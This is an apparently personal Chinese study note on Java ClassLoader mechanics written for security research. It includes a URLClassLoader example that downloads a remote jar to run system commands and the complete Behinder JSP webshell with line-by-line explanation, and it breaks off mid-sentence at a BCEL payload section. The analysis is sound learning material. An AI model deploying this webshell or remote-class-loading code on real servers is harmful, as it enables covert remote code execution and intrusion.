### 一、**ClassLoader(类加载机制)**

1. 将java程序编译成class文件
2. 调用java.lang.ClassLodaer加载类字节码
3. ClassLoader会调用JVM的native方法（defineClass0/1/2）来定义一个java.lang.Class实例

![img](file:///C:\Users\aaa\AppData\Local\Temp\ksohtml24480\wps1.jpg)

从jvm架构图上理解，classloader将java字节码加载到jvm所在的内存区内

### 二、**基本classloader种类**

Bootstrap ClassLoader（引导类加载器）、Extension ClassLoader（扩展类加载器）、App ClassLoader（系统类加载器）

其中bootstrap classloader 引导类加载器使用C/C++语言实现，在jvm内部，用于加载java核心类库，不能继承ClassLoader。只加载名为java,javax,sun开头的类

另外两个为自定义类加载器（以是否继承ClassLoader来判断）:

其中Extension ClassLoader.使用java语言编写，jvm自带。父类加载器为启动类加载器，负责加载java.ext.dirs指定路径下加载类库，或从jdk安装目录下的jre/lib/ext目录加载类，用户自定义jar包放入也能加载

其中AppClassloader，使用java语言编写，jvm自带。父类加载器为扩展类加载器，负责加载环境变量classpath或系统属性java.class.path指定的类库，java中自己写的类都是由应用程序类加载器加载的。

 

App ClassLoader默认类加载器，类不指定加载器是，默认使用Appclasslodeer加载类，ClassLoader.getSystemClassLoader()返回的系统类加载器也是AppClassLoader。

 

值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个null值，如:java.io.File.class.getClassLoader()将返回一个null对象，因为java.io.File类在JVM初始化的时候会被Bootstrap ClassLoader（引导类加载器）加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被Bootstrap ClassLoader类加载器所加载的类的ClassLoader时候都会返回null。

 

ClassLoader类有如下核心方法：

1. loadClass（加载指定的Java类）
2. findClass（查找指定的Java类）
3. findLoadedClass（查找JVM已经加载过的类）
4. defineClass（定义一个Java类）
5. resolveClass（链接指定的Java类

### **三、Java类动态加载方式**

1.Java反射

// 反射加载TestHelloWorld示例

Class.forName("com.anbai.sec.classloader.TestHelloWorld");

2.new加载对象

/ ClassLoader加载TestHelloWorld示例this.getClass().getClassLoader().loadClass("com.anbai.sec.classloader.TestHelloWorld");

### **四、classloder类加载流程**

1.ClassLoader会调用public Class<?> loadClass(String name)方法加载com.anbai.sec.classloader.TestHelloWorld类。（先加载）

2.调用findLoadedClass方法检查TestHelloWorld类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。（判断是否已经初始化，若初始化则直接返回类对象）

3.如果创建当前ClassLoader时传入了父类加载器（new ClassLoader(父类加载器)）就使用父类加载器加载TestHelloWorld类，否则使用JVM的Bootstrap ClassLoader加载。（选择加载器，否则使用默认的Bootstrap ClassLoader）

4.如果上一步无法加载TestHelloWorld类，那么调用自身的findClass方法尝试加载TestHelloWorld类。

5.如果当前的ClassLoader没有重写了findClass方法，那么直接返回类加载失败异常。如果当前类重写了findClass方法并通过传入的com.anbai.sec.classloader.TestHelloWorld类名找到了对应的类字节码，那么应该调用defineClass方法去JVM中注册该类。

6.如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类，默认为false。

7.返回一个被JVM加载后的java.lang.Class类对象。

 

### **五、自定义classloader** 

#### **1.下面一个示例通过自定义classloader加载类**

伪代码展示

​	public class TestClassLoader extends ClassLoader {

​	//自定义classloader需要继承classloader父类

​	 private static String testClassName = "com.anbai.sec.classloader.TestHelloWorld";

​	定义类名静态遍历

}

####  2.urlclassloader

​	

```java
package com.anbai.sec.classloader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * Creator: yz
 * Date: 2019/12/18
 */
public class TestURLClassLoader {

	public static void main(String[] args) {
		try {
			// 定义远程加载的jar路径
			URL url = new URL("https://anbai.io/tools/cmd.jar");

			// 创建URLClassLoader对象，并加载远程jar包
			URLClassLoader ucl = new URLClassLoader(new URL[]{url});

			// 定义需要执行的系统命令
			String cmd = "ls";

			// 通过URLClassLoader加载远程jar包中的CMD类
			Class cmdClass = ucl.loadClass("CMD");

			// 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");
			Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);

			// 获取命令执行结果的输入流
			InputStream           in   = process.getInputStream();
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			byte[]                b    = new byte[1024];
			int                   a    = -1;

			// 读取命令执行结果
			while ((a = in.read(b)) != -1) {
				baos.write(b, 0, a);
			}

			// 输出命令执行结果
			System.out.println(baos.toString());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}

```

 	上面代码注释已经很清晰了

​	我们还需要了解，如何打jar包，并将jar放入自己的服务器中，以此来执行命令。

 	方法步骤

​	（1）用记事本写一个Hello.java的文件

```
    1 class Hello{
    2     public static void main(String[] agrs){
    3         System.out.println("hello");
    4     }
    5 }
```

​	（2）用命令行进入到该目录下，编译这个文件

　　	 javac Hello.java 

​	（3）将编译后的Hello.class文件打成jar包

　　	 jar -cvf hello.jar Hello.class 

　　	c表示要创建一个新的jar包，v表示创建的过程中在控制台输出创建过程的一些信息，	f表示给生成的jar包命名

​	（4）运行jar包

　　 java -jar hello.jar  这时会报如下错误 hello.jar中没有主清单属性 

　　添加Main-Class属性

　　用压缩软件打开hello.jar，会发现里面多了一个META-INF文件夹，里面有一个MENIFEST.MF的文件，用记事本打开

```
1 Manifest-Version: 1.0
2 Created-By: 1.8.0_121 (Oracle Corporation)
3 
```

　　在第三行的位置写入 Main-Class: Hello （注意冒号后面有一个空格，整个文件最后有一行空行），保存

　　再次运行 java -jar hello.jar ，此时成功在控制台看到 hello ，成功

### 六、类加载隔离

创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。

![image-20230510150820656](C:\Users\aaa\AppData\Roaming\Typora\typora-user-images\image-20230510150820656.png)



### **七、冰蝎一句话理解**

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>

<%!

  class U extends ClassLoader {

 

​    U(ClassLoader c) {

​      super(c); //super(调用父类classLoader的构造方法)

​    }

 

​    public Class g(byte[] b) {

​      return super.defineClass(b, 0, b.length); 

​		//传入字节码调用，父类classLoder的defineClass传入字节码加载类

​    }

  }

%>

<%

  if (request.getMethod().equals("POST")) {

​    String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/

​    session.putValue("u", k);

​    Cipher c = Cipher.getInstance("AES");

​    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

​	//很明显，第一个参数，指定了密码的模式，第二个参数就是一个KEY类的实例，KEY类也很单纯，抛去各种方法，函数，也就是两个变量，一个是密钥，一个是算法名。2为解密模式

​    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);

  }

%>

 

***\*request.getReader().readLine()\**** ***\*读取post包的首行\****

 

***\*new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())\****

 然后，使用BASE64解码该行

 

***\*c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))\****

然后调用上面所说的密码工具对其进行AES解密（解密模式在init初始化时由2决定）。

 

new U(this.getClass().getClassLoader())

实例化了一个U类，在构造函数中取得了一个ClassLoader作为父类，来给U调用父类的构造方法。

然后调用它的g方法来执行defineClass,也就是加载字节码，参数是上面解密后的内容。然后newInstance实例化（define不会执行任何初始化代码，包括static和constructor）

 

###  八、BCEL ClassLoader

​	[BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名`org.apache.bcel.util.ClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`，BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被用于编写各类攻击Payload。



 	当BCEL的`com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass`加载一个类名中带有`$$BCEL$$`的类时会截取出`$$BCEL$$`后面的字符串，然后使用`com.sun.org.apache.bcel.internal.classfile.Utility#decode`将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用`defineClass`注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。

​	构建核心在于可以